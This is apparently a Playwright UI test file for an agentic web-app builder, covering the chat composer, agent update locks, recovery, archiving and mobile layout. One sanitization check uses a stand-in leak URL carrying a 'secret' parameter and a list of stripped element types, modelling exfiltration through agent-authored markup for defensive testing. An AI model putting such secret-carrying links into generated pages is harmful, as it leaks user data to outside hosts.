    expect(frame.locator("#settings-popover")).to_be_visible()
    frame.locator("#app-title").click()
    expect(frame.locator("#settings-popover")).to_be_hidden()
    expect(frame.locator("#settings-open")).to_have_attribute("aria-expanded", "false")
    frame.locator("#settings-open").click()
    expect(frame.locator("#settings-popover")).to_be_visible()
    expect(frame.locator("#runtime")).to_have_value("codex")
    expect(frame.locator("#model")).to_have_value("gpt-5.6-terra")
    expect(frame.locator("#effort")).to_have_value("high")

    with page.expect_file_chooser() as chooser:
        frame.get_by_role("button", name="Attach files").click()
    chooser.value.set_files({
        "name": "weekly-focus.txt",
        "mimeType": "text/plain",
        "buffer": b"Prioritize the release checklist.",
    })
    expect(frame.locator("#attachments")).to_contain_text("weekly-focus.txt")
    frame.locator("#message").fill("Build a small weekly focus dashboard.")
    frame.get_by_role("button", name="Send message", exact=True).click()
    expect(frame.locator("#runtime")).to_be_disabled()
    expect(frame.locator("#latest-agent-card")).to_be_visible()
    expect(frame.locator("#latest-agent-message")).to_have_text(INTERIM_AGENT_MESSAGE)
    expect(frame.locator("#chat-history")).to_have_count(0)
    send_box = frame.locator("#send-message").bounding_box()
    stop_box = frame.locator("#stop-turn").bounding_box()
    if not send_box or not stop_box:
        raise AssertionError("Send or Stop agent is not visible during agent work")
    send_right = send_box["x"] + send_box["width"]
    stop_right = stop_box["x"] + stop_box["width"]
    if abs(send_right - stop_right) > 2 or abs(send_box["height"] - stop_box["height"]) > 2:
        raise AssertionError(
            f"Send and Stop agent are not aligned: send={send_box}, stop={stop_box}"
        )
    composer_box = frame.locator(".composer-row").bounding_box()
    if not composer_box:
        raise AssertionError("Composer row is not visible")
    send_top_gap = send_box["y"] - composer_box["y"]
    send_bottom_gap = (
        composer_box["y"] + composer_box["height"]
        - send_box["y"] - send_box["height"]
    )
    if send_top_gap < 3 or send_bottom_gap < 3:
        raise AssertionError(
            "Send should have equivalent vertical breathing room: "
            f"send={send_box}, composer={composer_box}"
        )
    expect(frame.locator(".dashboard")).to_be_visible(timeout=20_000)
    expect(frame.locator(".dashboard")).to_have_css("display", "grid")
    expect(frame.locator(".dashboard")).to_have_css("max-width", "768px")
    expect(frame.locator(".metric")).to_have_css("display", "flex")
    generated_sheet_count = frame.locator("#generated-host").evaluate(
        "element => element.shadowRoot.adoptedStyleSheets.length"
    )
    if generated_sheet_count != 1:
        raise AssertionError(
            f"generated app should have one sanitized stylesheet, got {generated_sheet_count}"
        )
    expect(frame.locator("#runtime")).to_be_enabled()
    expect(frame.locator("#latest-agent-card")).to_be_visible()
    frame.get_by_role("button", name="Dismiss agent message", exact=True).click()
    expect(frame.locator("#latest-agent-card")).to_be_hidden()
    _start_host_app(page)
    _open_host_app(page, "app-1")
    expect(frame.locator("#latest-agent-card")).to_be_hidden()
    # A fresh Web Apps mount suppresses retained agent output even when
    # browser storage did not keep the dismissal key.
    page.evaluate(
        "localStorage.removeItem('kern.agentic-web-app.dismissed-agent-messages.v1')"
    )
    page.reload(wait_until="domcontentloaded")
    _open_host_app(page, "app-1")
    expect(frame.locator("#latest-agent-card")).to_be_hidden()

    lock_updates = frame.locator("#lock-agent-updates")
    lock_updates.click()
    expect(lock_updates).to_have_attribute("aria-pressed", "true")
    expect(lock_updates).to_have_attribute("aria-label", "Unlock agent updates")
    expect(frame.locator("#runtime-status")).to_have_text(
        "Agent updates locked. Agents will be asked to retry later."
    )
    _open_host_app(page, "app-2")
    _open_host_app(page, "app-1")
    unlock_updates = frame.locator("#lock-agent-updates")
    expect(unlock_updates).to_have_attribute("aria-pressed", "true")
    unlock_updates.click()
    expect(unlock_updates).to_have_attribute("aria-pressed", "false")
    expect(unlock_updates).to_have_attribute("aria-label", "Lock agent updates")

    generated = frame.locator("#generated-host")
    expect(generated.locator("#x-reply-intent")).to_have_count(1)
    expect(generated.locator("#x-reply-intent")).to_have_attribute(
        "href", "https://x.com/intent/tweet?in_reply_to=9001&text=Prepared%20reply"
    )
    expect(generated.locator("#x-reply-intent")).to_have_attribute("target", "_blank")
    expect(generated.locator("#x-reply-intent")).to_have_attribute("rel", "noopener noreferrer")
    expect(generated.locator("#github-link")).to_have_attribute(
        "href", "https://github.com/infiversehq/kern/pull/264"
    )
    expect(generated.locator("#github-link")).to_have_attribute(
        "title", "https://github.com/infiversehq/kern/pull/264"
    )
    expect(generated.locator("#instagram-link")).to_have_attribute(
        "href", "https://www.instagram.com/reel/ABC123/"
    )
    expect(generated.locator("#x-message-compose")).to_have_attribute(
        "href", "https://twitter.com/messages/compose?recipient_id=123456789&text=Prepared%20DM"
    )
    expect(generated.locator("#copy-only-link")).to_have_attribute(
        "data-kern-copy-href", "https://browser-leak.invalid/navigation?secret=anchor"
    )
    expect(generated.locator("#copy-only-link")).to_have_js_property("tagName", "BUTTON")
    expect(generated.locator("#invalid-scheme-link")).to_have_count(0)
    expect(
        generated.locator(
            "img, iframe, object, embed, svg, math, template, noscript, unknown-surface, script"
        )
    ).to_have_count(0)
    expect(generated.locator("a")).to_have_count(4)
    page.wait_for_timeout(300)
    if leaked:
        raise AssertionError(f"agent-authored UI caused browser requests: {leaked}")

    reviewed = frame.get_by_role("checkbox", name="Reviewed", exact=True)
    frame.get_by_role("button", name="Add priority", exact=True).click()
    expect(frame.locator(".metric strong")).to_have_text("3")

    # Generated data writes apply immediately because they carried the exact
    # displayed revision.
    expect(frame.locator("#app-update-veil")).to_be_hidden()
    frame.get_by_role("button", name="Refresh analysis", exact=True).click()
    expect(frame.locator("#runtime-status")).to_have_text("Sent to agent")
    # A revision discovered from any other writer freezes only the stale
    # canvas and coalesces behind one explicit update.
    expect(frame.locator("#app-update-veil")).to_be_visible(timeout=20_000)
    expect(frame.locator("#message")).to_be_enabled()
    frame.get_by_role("button", name="Update app", exact=True).click()
    expect(frame.locator("#app-update-veil")).to_be_hidden()
    expect(frame.locator(".analysis")).to_contain_text("Two priorities remain open")

    frame.get_by_role("button", name="Rename app", exact=True).click()
    expect(frame.get_by_role("dialog", name="Rename app")).to_be_visible()
    frame.locator("#rename-app-input").fill("Weekly focus")
    frame.locator("#rename-app-form").get_by_role("button", name="Save").click()
    expect(frame.locator("#app-title")).to_have_text("Weekly focus")
    expect(page.locator("#web-apps-nav-items")).to_contain_text("Weekly focus")

    frame.get_by_role("button", name="Recovery", exact=True).click()
    expect(frame.locator("#recovery-drawer")).to_be_visible()
    expect(frame.locator(".history-item")).not_to_have_count(0)
    restore = frame.locator("button[data-restore-revision]").last
    expect(restore).to_be_visible()
    page.once("dialog", lambda dialog: dialog.accept())
    restore.click()
    expect(frame.locator("#runtime-status")).to_have_text("App restored")
    frame.get_by_role("button", name="Close Recovery", exact=True).click()

    frame.locator("#message").fill("Keep this unsent human draft.")
    _start_host_app(page)
    expect(frame.locator("#message")).to_have_value("")
    _open_host_app(page, "Weekly focus")
    expect(frame.locator("#message")).to_have_value("Keep this unsent human draft.")

    # Archive is explicit in the App toolbar and returns to the library.
    page.evaluate(
        """appId => {
          const nativeApi = window.KernHost.api;
          const archivePath = `/v1/workspace/web-apps/apps/${encodeURIComponent(appId)}/archive`;
          window.KernHost.api = (method, path, body) => {
            if (method !== "POST" || path !== archivePath) return nativeApi(method, path, body);
            return new Promise((resolve, reject) => {
              window.__releaseSlowAppArchive = () => {
                window.KernHost.api = nativeApi;
                return nativeApi(method, path, body).then(resolve, reject);
              };
            });
          };
        }""",
        "app-1",
    )
    page.once("dialog", lambda dialog: dialog.accept())
    frame.get_by_role("button", name="Archive app", exact=True).click()
    page.wait_for_function("() => typeof window.__releaseSlowAppArchive === 'function'")
    page.get_by_role("button", name="Home", exact=True).click()
    page.evaluate("window.__releaseSlowAppArchive()")
    expect(page.locator("#web-apps-nav-items")).not_to_contain_text("Weekly focus")
    expect(page.locator("#panel-home")).to_be_visible()
    expect(page).to_have_url(re.compile(r"#home$"))
    page.evaluate(
        """() => {
          history.pushState({ kernWorkspaceRoute: "apps", itemId: null }, "", "#apps");
          dispatchEvent(new PopStateEvent("popstate", { state: history.state }));
        }"""
    )
    expect(frame.locator("#app-view-toolbar")).to_be_hidden()
    expect(frame.locator("#empty-title")).to_have_text("Choose an app")
    expect(page).to_have_url(re.compile(r"#apps$"))
    page.evaluate(
        """() => {
          history.replaceState(null, "", "#apps");
          dispatchEvent(new PopStateEvent("popstate", { state: null }));
        }"""
    )
    page.wait_for_function(
        "() => history.state?.kernWorkspaceRoute === 'apps' && history.state?.itemId === null"
    )
    page.reload(wait_until="domcontentloaded")
    expect(page.locator("#panel-workspace-web-apps")).to_be_visible()
    expect(frame.locator("#empty-title")).to_have_text("Choose an app")
    expect(page).to_have_url(re.compile(r"#apps$"))
    expect(page.locator("#web-apps-nav-items")).not_to_contain_text("Weekly focus")

    # Archived Apps remain inspectable but cannot expose controls that only
    # fail after sending a write to the read-only backend.
    archived_toggle = page.locator('[data-action="show-web-app-archive"]')
    archived_toggle.click()
    expect(archived_toggle).to_have_attribute("aria-pressed", "true")
    archived_app = page.locator(
        "#web-apps-nav-items .workspace-nav-item", has_text="Weekly focus"
    )
    expect(archived_app).to_be_visible()
    archived_app.dispatch_event("click")
    expect(frame.locator("#archived-app-veil")).to_be_visible()
    expect(frame.locator("#agent-command-surface")).to_be_hidden()
    expect(frame.get_by_role("button", name="Rename app", exact=True)).to_be_disabled()
    expect(frame.get_by_role("button", name="Agent", exact=True)).to_be_disabled()
    expect(frame.get_by_role("button", name="Archived app", exact=True)).to_be_disabled()
    frame.get_by_role("button", name="Recovery", exact=True).click()
    expect(frame.locator("button[data-restore-revision]").first).to_be_disabled()
    frame.get_by_role("button", name="Close Recovery", exact=True).click()
    archived_toggle.click()
    expect(archived_toggle).to_have_attribute("aria-pressed", "false")


def mobile_smoke(page: Any) -> None:
    from playwright.sync_api import expect

    # Use the remaining active mock App after the desktop archive journey.
    _open_mobile_host_navigation(page)
    first = page.locator("#web-apps-nav-items .workspace-nav-item").first
    expect(first).to_be_visible()
    # The navigation list refreshes in place while live thread status polls;
    # dispatch promptly instead of requiring the row to survive Playwright's
    # multi-frame stability check.
    first.dispatch_event("click")
    frame = page.locator("#panel-workspace-web-apps")
    expect(frame.locator("#message")).to_be_visible()
    expect(frame.locator("#admin-overlay")).to_have_count(0)
    expect(frame.locator("#app-title")).to_be_visible()
    toolbar_overflow = frame.locator("#app-view-toolbar").evaluate(
        "element => element.scrollWidth - element.clientWidth"
    )
    if toolbar_overflow > 1:
        raise AssertionError(f"mobile Web App toolbar overflows by {toolbar_overflow}px")
    toolbar_box = frame.locator("#app-view-toolbar").bounding_box()
    title_box = frame.locator(".app-view-mode").bounding_box()
    actions_box = frame.locator(".app-view-actions").bounding_box()
    if not toolbar_box or not title_box or not actions_box:
        raise AssertionError("mobile Web App toolbar controls are not visible")
    if toolbar_box["height"] > 54:
        raise AssertionError(f"mobile Web App toolbar is too tall: {toolbar_box}")
    vertical_offset = abs(
        title_box["y"] + title_box["height"] / 2
        - actions_box["y"] - actions_box["height"] / 2
    )
    if vertical_offset > 2:
        raise AssertionError(
            f"mobile Web App title and actions are not on one row: title={title_box}, actions={actions_box}"
        )
    canvas_box = frame.locator(".app-canvas").bounding_box()
    composer_box = frame.locator("#agent-command-surface").bounding_box()
    shell_box = frame.locator("#builder-shell").bounding_box()
    if not canvas_box or not composer_box or not shell_box:
        raise AssertionError("mobile Web App canvas or bottom composer is not visible")
    if canvas_box["y"] + canvas_box["height"] > composer_box["y"] + 1:
        raise AssertionError(
            f"mobile Web App composer is not below the canvas: canvas={canvas_box}, composer={composer_box}"
        )
    bottom_offset = abs(
        composer_box["y"] + composer_box["height"]
        - shell_box["y"] - shell_box["height"]
    )
    if bottom_offset > 1:
        raise AssertionError(
            f"mobile Web App composer is not docked to the bottom: shell={shell_box}, composer={composer_box}"
        )
    built_app_id = page.evaluate(
        """async () => {
          const response = await window.KernHost.api("GET", "/v1/workspace/web-apps/apps");
          return response.apps.find(app => app.revision > 0 && !app.archived)?.app_id || null;
        }"""
    )
    if not built_app_id:
        raise AssertionError("mobile smoke has no generated App to exercise keyboard focus")
    _open_host_app(page, built_app_id)
    generated_input = frame.locator("#generated-host").locator("#enter-action")
    expect(generated_input).to_be_visible()
    if generated_input.evaluate(
        "element => parseFloat(getComputedStyle(element).fontSize)"
    ) < 16:
        raise AssertionError("generated App input would trigger iOS focus zoom")
    generated_input.focus()
    expect(page.locator("body")).to_have_class(re.compile(r"\bworkspace-input-focused\b"))
    page.evaluate(
        """() => {
          document.body.classList.remove('workspace-input-focused');
          window.__workspaceViewportRecoveryCalls = 0;
          const nativeScrollTo = window.scrollTo;
          window.__restoreScrollTo = () => { window.scrollTo = nativeScrollTo; };
          window.scrollTo = (...args) => {
            window.__workspaceViewportRecoveryCalls += 1;
            return nativeScrollTo.apply(window, args);
          };
          visualViewport.dispatchEvent(new Event('scroll'));
        }"""
    )
    page.wait_for_timeout(100)
    recovery_calls = page.evaluate("() => window.__workspaceViewportRecoveryCalls")
    page.evaluate("() => window.__restoreScrollTo()")
    if recovery_calls:
        raise AssertionError(
            "host viewport recovery fought a focused generated App field: "
            f"{recovery_calls} forced scrolls"
        )
    generated_input.evaluate("element => element.blur()")
    frame.get_by_role("button", name="Rename app", exact=True).click()
    expect(frame.get_by_role("dialog", name="Rename app")).to_be_visible()
    if frame.locator("#rename-app-input").evaluate(
        "element => parseFloat(getComputedStyle(element).fontSize)"
    ) < 16:
        raise AssertionError("mobile app rename input would trigger iOS focus zoom")
    frame.locator("#rename-app-cancel").click()

    _open_mobile_host_navigation(page)
    drawer = page.locator("#sidebar").bounding_box()
    viewport_height = page.evaluate("() => window.innerHeight")
    if not drawer or abs(drawer["y"]) > 1 or abs(drawer["height"] - viewport_height) > 1:
        raise AssertionError(
            f"Web App host navigation does not fill the viewport: {drawer}, viewport={viewport_height}"
        )
    page.locator("#nav-backdrop").click(position={"x": 380, "y": 400})
    frame.locator("#settings-open").click()
    expect(frame.locator("#settings-popover")).to_be_visible()
    frame.locator("#settings-open").press("Escape")
    frame.get_by_role("button", name="Recovery", exact=True).click()
    expect(frame.locator("#recovery-drawer")).to_be_visible()
    controls = frame.locator(
        "#settings-open, #lock-agent-updates, #recovery-open, #archive-app, #recovery-close, #send-message"
    )
    touch_heights = controls.evaluate_all(
        "elements => elements.map(element => element.getBoundingClientRect().height)"
    )
    if any(height < 43 for height in touch_heights):
        raise AssertionError(f"mobile App controls are too short: {touch_heights}")
    frame.get_by_role("button", name="Close Recovery", exact=True).click()
    overflow = frame.locator("#builder-shell").evaluate(
        "element => element.scrollWidth - element.clientWidth"
    )
    if overflow > 1:
        raise AssertionError(f"Agentic Web App overflows horizontally by {overflow}px")

    page.locator("#mobile-nav-toggle").click()
    page.get_by_role("button", name="Home", exact=True).click()
